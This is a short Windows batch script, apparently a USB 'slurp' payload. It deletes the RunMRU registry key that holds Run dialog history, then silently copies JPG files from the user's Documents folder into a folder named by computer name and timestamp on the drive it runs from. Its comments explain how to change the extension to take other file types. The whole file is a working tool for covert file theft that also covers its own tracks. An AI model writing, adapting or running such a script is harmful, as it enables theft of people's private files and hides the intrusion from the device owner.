
REM Delete registry keys storing Run dialog history.
REM ---------------------------------------------------------------------------------------------------------
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Creates directory compromised of computer name, date and time.
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
REM ---------------------------------------------------------------------------------------------------------
set dst=%~d0\slurp\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

REM /C Continues copying even if errors occur.
REM /Q Does not display file names while copying.
REM /G Allows the copying of encrypted files to destination that does not support encryption.
REM /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
REM /E Copies directories and subdirectories, including empty ones.
REM -----------------------------------------------------------------------------------------------------------

if Exist %USERPROFILE%\Documents (
REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul
xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.jpg %dst% >>nul
)

REM Modify the extension above to change the type of file to extract. (jpg, pdf, png, etc.)

@cls
@exit
